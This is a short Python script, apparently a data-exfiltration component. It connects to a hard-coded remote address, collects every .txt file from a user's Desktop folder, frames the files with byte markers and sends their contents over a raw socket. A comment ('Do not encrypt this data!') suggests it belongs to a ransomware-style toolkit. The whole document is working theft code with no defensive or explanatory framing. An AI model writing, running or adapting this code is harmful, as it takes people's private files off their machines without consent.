import os
import socket

socket_sender = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connection to server using given port
receiver_info = ("10.0.0.196", 59000)
socket_sender.connect(receiver_info)


pwd = os.getcwd()
os.chdir("C:\\Users\\user\\Desktop")  # example
files = os.listdir("C:\\Users\\user\\Desktop")

content = b''
for file in files:
    if file.endswith(".txt"):
        print(file)
        
        # Open file, add relevant begin and filename markers between data
        f = open(file, "rb")
        content += b'\x00\x01\x02BEGIN\x00\x01\x02'
        content += file.encode()
        content += b'\x00\x01\x02FILENAME\x00\x01\x02'
        content += f.read()
        # Close file
        f.close()

socket_sender.send(content)

# Important! Do not encrypt this data!        
socket_sender.send(b'\x00\x01\x02END\x00\x01\x02')

#socket_sender.send(bytes("done"))

socket_sender.close()
